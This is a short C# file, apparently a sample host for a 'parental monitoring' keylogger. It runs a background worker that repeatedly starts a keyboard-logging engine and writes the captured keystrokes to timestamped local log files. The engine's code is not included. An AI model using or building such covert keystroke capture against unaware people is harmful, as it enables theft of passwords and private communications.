namespace ParentalSight.Keylogger.Sample
{
    using Microsoft.Extensions.Hosting;
    using Microsoft.Extensions.Logging;
    using ParentalSight.Keylogger.Engines;
    using System;
    using System.IO;
    using System.Threading;
    using System.Threading.Tasks;

    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("Starting Keylogger at {time}", DateTimeOffset.Now);

                var now = DateTime.Now;
                var fileName = now.ToString("yyyy-MM-dd hh_mm_ss tt");
                var logPath = Path.Combine(Directory.GetCurrentDirectory(), "bin", $"{fileName}.log");

                var engine = new KeyboardLoggerEngine(logPath);
                engine.StartKeylogger(now.AddMinutes(1));

                _logger.LogInformation("Stopping Keylogger at {time}", DateTimeOffset.Now);

                await Task.Delay(5000, stoppingToken);
            }
        }
    }
}
